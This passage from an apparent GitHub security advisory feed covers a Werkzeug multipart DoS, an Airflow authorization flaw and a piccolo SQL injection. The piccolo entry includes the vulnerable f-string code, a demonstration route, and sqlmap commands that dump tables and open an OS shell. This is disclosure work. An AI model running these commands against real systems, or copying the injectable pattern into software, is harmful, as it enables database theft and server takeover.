<li><a href="https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1">https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46136">https://nvd.nist.gov/vuln/detail/CVE-2023-46136</a></li>
<li><a href="https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2">https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml</a></li>
<li><a href="https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9">https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9</a></li>
<li><a href="https://github.com/advisories/GHSA-hrfv-mqp8-q5rw">https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-25T14:22:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[werkzeug] Werkzeug DoS: High resource usage when parsing multipart/form-data containing a large part with CR/LF character at the beginning]]></title>
        <id>https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</id>
        <link href="https://github.com/advisories/GHSA-hrfv-mqp8-q5rw"/>
        <updated>2023-11-13T21:05:55.000Z</updated>
        <content type="html"><![CDATA[<p>Werkzeug multipart data parser needs to find a boundary that may be between consecutive chunks. That's why parsing is based on looking for newline characters. Unfortunately, code looking for partial boundary in the buffer is written inefficiently, so if we upload a file that starts with CR or LF and then is followed by megabytes of data without these characters: all of these bytes are appended chunk by chunk into internal bytearray and lookup for boundary is performed on growing buffer.</p>
<p>This allows an attacker to cause a denial of service by sending crafted multipart data to an endpoint that will parse it. The amount of CPU time required can block worker processes from handling legitimate requests. The amount of RAM required can trigger an out of memory kill of the process. If many concurrent requests are sent continuously, this can exhaust or kill all available workers.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw">https://github.com/pallets/werkzeug/security/advisories/GHSA-hrfv-mqp8-q5rw</a></li>
<li><a href="https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1">https://github.com/pallets/werkzeug/commit/b1916c0c083e0be1c9d887ee2f3d696922bfc5c1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-46136">https://nvd.nist.gov/vuln/detail/CVE-2023-46136</a></li>
<li><a href="https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2">https://github.com/pallets/werkzeug/commit/f3c803b3ade485a45f12b6d6617595350c0f03e2</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/werkzeug/PYSEC-2023-221.yaml</a></li>
<li><a href="https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9">https://github.com/pallets/werkzeug/commit/f2300208d5e2a5076cbbb4c2aad71096fd040ef9</a></li>
<li><a href="https://github.com/advisories/GHSA-hrfv-mqp8-q5rw">https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hrfv-mqp8-q5rw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-10-25T14:22:59.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow allows authenticated and DAG-view authorized users to modify some DAG run detail values when submitting notes]]></title>
        <id>https://github.com/advisories/GHSA-hm9r-7f84-25c9</id>
        <link href="https://github.com/advisories/GHSA-hm9r-7f84-25c9"/>
        <updated>2023-11-13T20:43:21.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow, versions before 2.7.3, is affected by a vulnerability that allows authenticated and DAG-view authorized Users to modify some DAG run detail values when submitting notes. This could have them alter details such as configuration parameters, start date, etc.&nbsp; Users should upgrade to version 2.7.3 or later which has removed the vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47037">https://nvd.nist.gov/vuln/detail/CVE-2023-47037</a></li>
<li><a href="https://github.com/apache/airflow/pull/33413">https://github.com/apache/airflow/pull/33413</a></li>
<li><a href="https://lists.apache.org/thread/04y4vrw1t2xl030gswtctc4nt1w90cb0">https://lists.apache.org/thread/04y4vrw1t2xl030gswtctc4nt1w90cb0</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2023/11/12/1">http://www.openwall.com/lists/oss-security/2023/11/12/1</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-232.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2023-232.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-hm9r-7f84-25c9">https://github.com/advisories/GHSA-hm9r-7f84-25c9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hm9r-7f84-25c9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-11-12T15:30:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[piccolo] piccolo SQL Injection via named transaction savepoints]]></title>
        <id>https://github.com/advisories/GHSA-xq59-7jf3-rjc6</id>
        <link href="https://github.com/advisories/GHSA-xq59-7jf3-rjc6"/>
        <updated>2023-11-12T15:57:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The handling of named transaction savepoints in all database implementations is vulnerable to <a href="https://owasp.org/www-community/attacks/SQL_Injection">SQL Injection</a> as user provided input is passed directly to <code>connection.execute(...)</code> via f-strings.</p>
<h3 id="details">Details</h3>
<p>An excerpt of the Postgres savepoint handling:</p>
<pre><code class="language-python">    async def savepoint(self, name: t.Optional[str] = None) -&gt; Savepoint:
        name = name or f"savepoint_{self.get_savepoint_id()}"
        await self.connection.execute(f"SAVEPOINT {name}")
        return Savepoint(name=name, transaction=self)
</code></pre>
<p>In this example, we can see user input is directly passed to <code>connection.execute</code> without being properly escaped. </p>
<p>All implementations of savepoints and savepoint methods directly pass this <code>name</code> parameter to <code>connection.execute</code> and are vulnerable to this. A non-exhaustive list can be found below:</p>
<ul>
<li>Postgres</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L239">One</a></li>
</ul>
</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L133">Two</a></li>
</ul>
</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L138">Three</a></li>
</ul>
</li>
<li>Sqlite</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L416">One</a></li>
</ul>
</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L313">Two</a></li>
</ul>
</li>
<li><ul>
<li><a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/sqlite.py#L318">Three</a></li>
</ul>
</li>
</ul>
<p>Care should be given to ensuring all strings passed to <code>connection.execute</code> are properly escaped, regardless of how end user facing they may be.</p>
<p>Further to this, the <a href="https://github.com/piccolo-orm/piccolo/blob/master/piccolo/engine/postgres.py#L404">following method</a> also passes user input directly to an execution context however I have been unable to abuse this functionality at the time of writing. This method also has a far lower chance of being exposed to an end user as it relates to database init functionality.</p>
<h3 id="poc">PoC</h3>
<p>The following FastAPI route can be used in conjunction with <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> to easily demonstrate the SQL injection.</p>
<pre><code class="language-python">DB = ...

@app.get("/test")
async def test(name):
    async with DB.transaction() as transaction:
        await transaction.savepoint(name)
</code></pre>
<h5 id="steps">Steps</h5>
<ol>
<li>Create a standard Piccolo application with Postgres as a database backend</li>
<li>Add the route shown previously</li>
<li>Run your application, making a note of the URL it is served on</li>
<li>Install <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a></li>
<li>In a terminal, run the following command substituting URL with your applications URL: <code>sqlmap -u "http://URL/test?name=a" --batch</code></li>
<li>Observe sqlmap identifying the vulnerability</li>
</ol>
<p>For sqlmap help, <a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">this usage guide</a> may be useful. The following commands may also be helpful to see the impact.</p>
<h6 id="dumping-all-tables">Dumping all tables</h6>
<p>The <code>--tables</code> flag will enumerate all tables accessible from within the exposed database session.</p>
<p><code>sqlmap -u "http://URL/test?name=a" --batch --tables</code></p>
<p>An example output of this can be seen in the following screenshot.
<img alt="Screenshot from 2023-11-06 23-10-30" src="https://user-images.githubusercontent.com/47520067/280669236-5be9dc0f-4d2c-4bad-a1ba-fc1eb43fdb34.png"></p>
<h6 id="os-shell">OS Shell</h6>
<p>The <code>--os-shell</code> will drop the user into an OS shell on the underlying system if permissions permit. This can be seen in the attached screenshot which prints the databases current working directory. 
<img alt="Screenshot from 2023-11-06 22-43-50" src="https://user-images.githubusercontent.com/47520067/280668670-0a152589-5f4c-468d-99b9-045226934007.png"></p>
<h3 id="impact">Impact</h3>
<p>While the likelihood of an end developer exposing a savepoints <code>name</code> parameter to a user is highly unlikely, it would not be unheard of. If a malicious user was able to abuse this functionality they would have essentially direct access to the database and the ability to modify data to the level of permissions associated with the database user. </p>
<p>A non exhaustive list of actions possible based on database permissions is:</p>
<ul>
<li>Read all data stored in the database, including usernames and password hashes</li>
<li>Insert arbitrary data into the database, including modifying existing records </li>
<li>Gain a shell on the underlying server</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/piccolo-orm/piccolo/security/advisories/GHSA-xq59-7jf3-rjc6">https://github.com/piccolo-orm/piccolo/security/advisories/GHSA-xq59-7jf3-rjc6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47128">https://nvd.nist.gov/vuln/detail/CVE-2023-47128</a></li>
<li><a href="https://github.com/piccolo-orm/piccolo/commit/82679eb8cd1449cf31d87c9914a072e70168b6eb">https://github.com/piccolo-orm/piccolo/commit/82679eb8cd1449cf31d87c9914a072e70168b6eb</a></li>
<li><a href="https://github.com/advisories/GHSA-xq59-7jf3-rjc6">https://github.com/advisories/GHSA-xq59-7jf3-rjc6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xq59-7jf3-rjc6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2023-11-12T15:57:28.000Z</published>
    </entry>
</feed>